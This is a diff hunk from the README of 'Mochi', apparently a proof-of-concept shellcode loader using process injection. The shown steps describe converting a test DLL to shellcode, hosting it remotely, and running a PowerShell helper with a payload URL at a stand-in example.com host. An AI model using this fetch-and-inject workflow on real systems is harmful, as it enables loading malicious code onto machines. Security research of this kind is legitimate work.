@@ -52,7 +52,7 @@ The Mochi loader implements local process injection of a shellcode payload. This
 To run the Mochi PoC, you'll need to perform the following steps:
 1. Generate a shellcode payload in binary format.
 * During testing, [sRDI](https://github.com/monoxgas/sRDI) was used to convert a [message box payload](https://github.com/monoxgas/sRDI/tree/master/TestDLL) DLL file to a shellcode "*.bin" file.
-2. Upload the shellcode payload binary file to a remote hosting location, such as an S3 bucket. Obtain the URL and note it down.
+2. Upload the shellcode binary file to a remote hosting location, such as an S3 bucket. Obtain the URL and note it down.
 3. Execute the following PowerShell helper script with your shellcode payload URL:
 ```
 .\helper_scripts\chaiscript_inject_module_init.ps1 -payloadUrl "https://example.com/shellcode.bin"
